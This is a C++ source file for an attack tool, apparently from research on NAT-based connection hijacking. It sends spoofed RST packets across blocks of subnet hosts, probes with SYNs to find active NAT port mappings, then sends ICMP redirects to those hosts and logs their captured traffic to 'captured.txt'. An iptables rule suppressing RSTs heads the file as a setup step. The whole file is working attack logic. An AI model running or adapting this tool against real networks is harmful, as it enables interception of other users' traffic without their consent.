/*
 * attack_s.cpp  —  sequential version (block-sequential, all ports parallel within block)
 *
 * NOTE: suppress kernel RST responses before running:
 *   sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 *
 * Build:  make attack_s
 * Run:    sudo ./attack_s --ports <file> --subnet 24
 *         sudo ./attack_s --ports <file> --hosts  <mac_ip_file>
 */

#include "common.h"

static void usage(const char* prog) {
    cerr << "Usage:\n"
         << "  " << prog << " --ports <file> --subnet <prefix>  [options]\n"
         << "  " << prog << " --ports <file> --hosts  <file>    [options]\n"
         << "\nOptions:\n"
         << "  --block       IPs per block           (default 10)\n"
         << "  --nat-wait    seconds after RST        (default " << NAT_CLEAR_WAIT  << ")\n"
         << "  --syn-wait    seconds to wait for SYN response (default " << SYN_WAIT << ")\n"
         << "  --block-wait  pause between blocks on no-response (default " << INTER_BLOCK_WAIT << ")\n";
}

int main(int argc, char* argv[]) {
    ts_ms();   // start clock

    string ports_file, hosts_file;
    int prefix = -1, block_sz = 10;
    int nat_wait = NAT_CLEAR_WAIT, syn_wait = SYN_WAIT, inter_block = INTER_BLOCK_WAIT;

    for (int i = 1; i < argc; i++) {
        string a = argv[i];
        if      (a == "--ports"      && i+1 < argc) ports_file  = argv[++i];
        else if (a == "--hosts"      && i+1 < argc) hosts_file  = argv[++i];
        else if (a == "--subnet"     && i+1 < argc) prefix      = stoi(argv[++i]);
        else if (a == "--block"      && i+1 < argc) block_sz    = stoi(argv[++i]);
        else if (a == "--nat-wait"   && i+1 < argc) nat_wait    = stoi(argv[++i]);
        else if (a == "--syn-wait"   && i+1 < argc) syn_wait    = stoi(argv[++i]);
        else if (a == "--block-wait" && i+1 < argc) inter_block = stoi(argv[++i]);
    }

    if (ports_file.empty() || (prefix < 0 && hosts_file.empty())) {
        usage(argv[0]); return 1;
    }

    auto ports = load_ports(ports_file);
    if (ports.empty()) { cerr << "No ports loaded\n"; return 1; }
    cout << ts() << "Ports: " << ports.size() << "\n";

    vector<Host> all_hosts;
    if (!hosts_file.empty()) {
        all_hosts = load_hosts(hosts_file);
        cout << ts() << "Hosts from file: " << all_hosts.size() << "\n";
    } else {
        for (auto& ip : subnet_hosts(ATTACKER_IP, prefix))
            all_hosts.push_back({ip, ""});
        cout << ts() << "Hosts from /" << prefix << ": " << all_hosts.size() << "\n";
    }

    NetworkInterface iface(IFACE);
    PacketSender     sender;
    string           self_mac = iface.hw_address().to_string();

    cout << ts() << "Resolving gateway MAC (" << GATEWAY_IP << ")... ";
    string gw_mac = resolve_mac(GATEWAY_IP, iface, sender);
    cout << gw_mac << "\n";

    map<string,string> mac_cache;
    for (const auto& h : all_hosts)
        if (!h.mac.empty()) mac_cache[h.ip] = h.mac;

    vector<vector<Host>> blocks;
    for (size_t i = 0; i < all_hosts.size(); i += block_sz) {
        size_t end = min(i + (size_t)block_sz, all_hosts.size());
        blocks.emplace_back(all_hosts.begin() + i, all_hosts.begin() + end);
    }
    cout << ts() << all_hosts.size() << " hosts in " << blocks.size()
         << " blocks (k=" << block_sz << ")\n\n";

    ofstream cap_log("captured.txt", ios::app);
    mutex    log_mtx;
    vector<thread> sessions;

    vector<uint16_t> active_ports = ports;

    for (size_t bi = 0; bi < blocks.size() && !active_ports.empty(); bi++) {
        const auto& block = blocks[bi];
        cout << ts() << "=== Block " << bi+1 << "/" << blocks.size()
             << " [" << block.front().ip << " .. " << block.back().ip << "]"
             << "  active ports: " << active_ports.size() << " ===\n";

        // 1. RST all active ports from every IP in block (one nat_wait covers all)
        cout << ts() << "  Sending " << block.size() * active_ports.size() << " RSTs...\n";
        for (uint16_t port : active_ports)
            rst_block(block, port, iface, sender, self_mac, gw_mac);

        // 2. Wait for NAT to clear CLOSE-state entries
        cout << ts() << "  Waiting " << nat_wait << "s for NAT...\n";
        this_thread::sleep_for(chrono::seconds(nat_wait));

        // 3. Start sniffer for all active ports, then SYN for each
        BlockProbeResult result;
        atomic<bool> probe_stop{false};
        Sniffer probe_sn(IFACE, sniffer_cfg(probe_block_filter()));
        thread probe_th([&]() { result = probe_block(probe_sn, active_ports, probe_stop); });
        this_thread::sleep_for(chrono::milliseconds(100));

        cout << ts() << "  Sending " << active_ports.size() << " SYNs...\n";
        for (uint16_t port : active_ports)
            syn_probe(port, iface, sender, self_mac, gw_mac);

        this_thread::sleep_for(chrono::seconds(syn_wait));
        probe_stop = true;
        probe_sn.stop_sniff();
        probe_th.join();

        cout << ts() << "  Probe done: " << result.c_acks.size()
             << " c-ACK(s), " << result.syn_acks.size() << " SYN-ACK(s)\n";

        if (result.c_acks.empty()) {
            cout << ts() << "  No active mappings in block, waiting "
                 << inter_block << "s...\n\n";
            this_thread::sleep_for(chrono::seconds(inter_block));
            continue;
        }

        // 4. Resolve MACs for block (cached; only ARPs unknown IPs)
        for (const auto& h : block) {
            if (!mac_cache.count(h.ip)) {
                cout << ts() << "    ARP " << h.ip << "... ";
                mac_cache[h.ip] = resolve_mac(h.ip, iface, sender);
                cout << mac_cache[h.ip] << "\n";
            }
        }

        // 5. For each c-ACK: send ICMP redirect to all hosts in block, spawn capture
        vector<uint16_t> matched;
        for (auto& [port, seq] : result.c_acks) {
            cout << ts() << "  c-ACK port=" << port << " seq=" << seq
                 << " -> sending ICMP redirects to block...\n";
            icmp_redirect(block, port, seq, iface, sender, self_mac, gw_mac, mac_cache);
            sessions.push_back(spawn_capture(block, port, SNIFF_WAIT, cap_log, log_mtx));
            cout << ts() << "  Capture started for port " << port << "\n";
            matched.push_back(port);
        }

        // 6. Drop matched ports from active set
        vector<uint16_t> remaining;
        for (uint16_t p : active_ports)
            if (find(matched.begin(), matched.end(), p) == matched.end())
                remaining.push_back(p);
        active_ports = remaining;

        if (!active_ports.empty())
            cout << ts() << "  Ports remaining: " << active_ports.size() << "\n";
        cout << "\n";
    }

    if (!active_ports.empty()) {
        cout << ts() << "Unresolved ports (" << active_ports.size() << "):";
        for (uint16_t p : active_ports) cout << " " << p;
        cout << "\n";
    }

    if (!sessions.empty()) {
        cout << ts() << "Waiting for " << sessions.size() << " capture session(s)...\n";
        for (auto& t : sessions) t.join();
    }

    cout << ts() << "All blocks done. Captured traffic in captured.txt\n";
    return 0;
}
